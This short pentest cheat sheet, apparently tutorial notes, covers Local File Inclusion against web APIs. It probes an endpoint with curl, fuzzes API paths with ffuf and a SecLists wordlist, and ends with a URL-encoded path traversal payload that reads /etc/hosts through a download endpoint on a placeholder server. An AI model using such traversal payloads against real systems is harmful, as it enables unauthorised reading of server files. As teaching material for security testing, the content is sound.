# Local File Inclusion (LFI)

Local File Inclusion (LFI) is an attack that affects web applications and APIs alike. It allows an attacker to read internal files and sometimes execute code on the server via a series of ways, one being `Apache Log Poisoning`.

#### Assess the API

Interact to retrieve information

```bash
curl http://SERVER_IP:PORT/api
```

#### Fuzz API endpoints

Wordlist - [common-api-endpoints-mazen160.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common-api-endpoints-mazen160.txt)

{% code overflow="wrap" %}
```bash
ffuf -w "api-endpoints-mazen160.txt" -u 'http://SERVER_IP:PORT/api/FUZZ'
```
{% endcode %}

#### Interact with the founded endpoint

```bash
curl "http://SERVER_IP:PORT/api/download"
```

#### Specify a common file&#x20;

```bash
curl "http://SERVER_IP:PORT/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"
```
